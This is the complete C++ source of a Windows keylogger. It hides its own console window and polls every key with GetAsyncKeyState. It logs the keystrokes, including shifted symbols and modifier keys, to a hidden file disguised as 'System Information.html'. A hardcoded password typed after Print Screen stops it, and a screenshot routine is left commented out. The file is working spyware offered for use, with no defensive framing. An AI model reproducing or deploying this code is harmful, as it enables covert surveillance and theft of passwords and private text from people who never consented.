#include<iostream>
#include<Windows.h>
#include<fstream>
#include<string.h>
#include <ctime>
#include<ctype.h>
using namespace std;
fstream file("System Information.html",ios::out|ios::app);
class Keylogger{
	private:
char d[80],b[80],a[80],pass[20]="burn_baby_burn";
int t=0;

	public:
	
//void screenshot()					//takes sceenshots in the background
//{
//	// Simulate a key press
//		keybd_event( VK_RWIN,0x5C, KEYEVENTF_EXTENDEDKEY | 0, 0);
//		keybd_event( VK_SNAPSHOT,0x2C, KEYEVENTF_EXTENDEDKEY | 0, 0);
//
//	// Simulate a key release
//	keybd_event( VK_RWIN,0x5C, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0);
//	keybd_event( VK_SNAPSHOT,0x2C, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0);
//}																																			
    void stealth(int i=0)				//hides the console window
{
	HWND stealth;
	AllocConsole();
	stealth=FindWindowA("ConsoleWindowClass",NULL);
 	ShowWindow(stealth,i);	
}

void line()
{
	for(int i=1;i<=167;i++)
	file<<"<font color=\"blue\">"<<"*"<<"</font>";
	file<<"<br>";
}
char *time_now(){					//for printing current time
	time_t now = time(0);
	char *dt = ctime(&now);
	return dt;
}

int z=0;
void play_point(char* d)			//for taking the pointer to the required postion in the file
{
	strcpy(b,d);
	file.seekp(z);
	file<<d;
	z+=strlen(b);
}

void keys(char i)					//checks the value of user input and prints it in the file
{
	
				if(i==32)
					play_point(" ");
				else if(GetAsyncKeyState(VK_BACK))
					play_point("[Backspace]");
				else if(GetAsyncKeyState(VK_OEM_COMMA))
					play_point("[Comma]");
				else if(GetAsyncKeyState(VK_SHIFT))
					{
						if(i==48)
						play_point("<font color=\"red\">)</font>");
						else if(i==49)
						play_point("<font color=\"red\">!</font>");
						else if(i==50)
						play_point("<font color=\"red\">@</font>");
						else if(i==51)
						play_point("<font color=\"red\">#</font>");
						else if(i==52)
						play_point("<font color=\"red\">$</font>");
						else if(i==53)
						play_point("<font color=\"red\">%</font>");
						else if(i==54)
						play_point("<font color=\"red\">^</font>");
						else if(i==55)
						play_point("<font color=\"red\">&</font>");
						else if(i==56)
						play_point("<font color=\"red\">*</font>");
						else if(i==57)
						play_point("<font color=\"red\">(</font>");
						else if(i>=65&&i<=90)
						file<<"<font color=\"red\">"<<i<<"</font>";
						else
						play_point("[Shift]");
					}
				else if(GetAsyncKeyState(VK_OEM_PERIOD))
					play_point("[DOT]");
				else if(GetAsyncKeyState(VK_LBUTTON)){
					play_point("[LMB]");
					}
				else if(GetAsyncKeyState(VK_RBUTTON))
					play_point("[RMB]");
				else if(GetAsyncKeyState(VK_CONTROL))
				{
					if(i>=65&&i<=90||i>=97&&i<=122)
					{
					play_point("{[Control]");
					file<<"+"<<i<<"}";
					file.seekp(z);
					}
				}
				else if(GetAsyncKeyState(VK_TAB))
					play_point("[Tab]");
				else if(GetAsyncKeyState(VK_MENU))
					play_point("[Alt Key]");
				else if(GetAsyncKeyState(VK_PAUSE))
					play_point("[Pause]");	
				else if(GetAsyncKeyState(VK_PRIOR))
					play_point("[Page UP]");
				else if(GetAsyncKeyState(VK_NEXT))
					play_point("[Page DOWN]");
				else if(GetAsyncKeyState(VK_END))
					play_point("[END]");
				else if(GetAsyncKeyState(VK_HOME))
					play_point("[HOME KEY]");
				else if(GetAsyncKeyState(VK_EXECUTE))
					play_point("[Execute]");
				else if(GetAsyncKeyState(VK_ESCAPE))
					play_point("[esc]");
				else if(GetAsyncKeyState(VK_DELETE))
					play_point("[Delete]");
				else if(GetAsyncKeyState(VK_RETURN))
					play_point("[Enter Key]<br>");
				else if(GetAsyncKeyState(VK_LEFT))
					play_point("[Left Key]");
				else if(GetAsyncKeyState(VK_UP))
					play_point("[UP Key]");
				else if(GetAsyncKeyState(VK_DOWN))
					play_point("[DOWN UP]");
				else if(GetAsyncKeyState(VK_RIGHT))
					play_point("[Right Key]");
				else if(GetAsyncKeyState(0x30))
					play_point("<font color=\"red\">0</font>");
				else if(GetAsyncKeyState(0X31))
					play_point("<font color=\"red\">1</font>");
				else if(GetAsyncKeyState(0X32))
					play_point("<font color=\"red\">2</font>");
				else if(GetAsyncKeyState(0X33))
					play_point("<font color=\"red\">3</font>");
				else if(GetAsyncKeyState(0X34))
					play_point("<font color=\"red\">4</font>");
				else if(GetAsyncKeyState(0X35))
					play_point("<font color=\"red\">5</font>");
				else if(GetAsyncKeyState(0X36))
					play_point("<font color=\"red\">6</font>");
				else if(GetAsyncKeyState(0X37))
					play_point("<font color=\"red\">7</font>");
				else if(GetAsyncKeyState(0X38))
					play_point("<font color=\"red\">8</font>");
				else if(GetAsyncKeyState(0X39))
					play_point("<font color=\"red\">9</font>");
				else if(GetAsyncKeyState(VK_NUMPAD0))
					play_point("<font color=\"red\">0</font>");
				else if(GetAsyncKeyState(VK_NUMPAD1))
					play_point("<font color=\"red\">1</font>");
				else if(GetAsyncKeyState(VK_NUMPAD2))
					play_point("<font color=\"red\">2</font>");
				else if(GetAsyncKeyState(VK_NUMPAD3))
					play_point("<font color=\"red\">3</font>");
				else if(GetAsyncKeyState(VK_NUMPAD4))
					play_point("<font color=\"red\">4</font>");
				else if(GetAsyncKeyState(VK_NUMPAD5))
					play_point("<font color=\"red\">5</font>");
				else if(GetAsyncKeyState(VK_NUMPAD6))
					play_point("<font color=\"red\">6</font>");
				else if(GetAsyncKeyState(VK_NUMPAD7))
					play_point("<font color=\"red\">7</font>");
				else if(GetAsyncKeyState(VK_NUMPAD8))
					play_point("<font color=\"red\">8</font>");
				else if(GetAsyncKeyState(VK_NUMPAD9))
					play_point("<font color=\"red\">9</font>");
				else if(GetAsyncKeyState(VK_F1))
					play_point("[F1]");
				else if(GetAsyncKeyState(VK_F2))
					play_point("[F2]");
				else if(GetAsyncKeyState(VK_F3))
					play_point("[F3]");
				else if(GetAsyncKeyState(VK_F4))
					play_point("[F4]");
				else if(GetAsyncKeyState(VK_F5))
					play_point("[F5]");
				else if(GetAsyncKeyState(VK_F6))
					play_point("[F6]");
				else if(GetAsyncKeyState(VK_F7))
					play_point("[F7]");
				else if(GetAsyncKeyState(VK_F8))
					play_point("[F8]");
				else if(GetAsyncKeyState(VK_F9))
					play_point("[F9]");	
				else if(GetAsyncKeyState(VK_F10))
					play_point("[F10]");
				else if(GetAsyncKeyState(VK_F11))
					play_point("[F11]");
				else if(GetAsyncKeyState(VK_F12))
					play_point("[F12]");	
				else if(GetAsyncKeyState(VK_SNAPSHOT)){	//Stop execution
					if(i==75)
					{
					file<<"[Print Screen]<br>";
					stealth(1);
					cout<<"Enter Password to stop execution: "<<endl;
					gets(a);
					if(strcmp(a,pass)==0)
						{
						line();
						cout<<"Correct Password Entered!";
						return;
						}
					else
						{
						cout<<"Wrong Password entered <<HIDING AGAIN>>"<<endl;
						Sleep(2000);
						stealth();
						}
					}
					}
				else{
					if(GetKeyState(VK_CAPITAL)==0) //checking the status of capslock key
					{
					
					i+=32;
					file.seekp(z);
					file<<"<font color=\"red\">"<<i<<"</font>";
					
					}
					else
					{
					file.seekp(z);
					file<<"<font color=\"red\">"<<i<<"</font>";
					}
				}
			t++;
			if(t==5)
			{
			t=0;
			//screenshot();
			}
}
};

int main()
{
	Keylogger a;
	char *q=a.time_now(),i;
	file<<"<title>System Information</title>";
	
	SetFileAttributes("System Information.html", FILE_ATTRIBUTE_HIDDEN); //making the file hidden
	
	a.stealth();
 	file<<"<br>"<<"<font color=\"blue\">"<<q<<"</font>"<<"<br>";
 	a.line();
 	a.z+=strlen(q);
 	
	while(true)
	{
		Sleep(10);
		for(i=8;i<=255;i++)
			if(GetAsyncKeyState(i)== -32767)
			{
				a.keys(i);
			}
		
	}
}












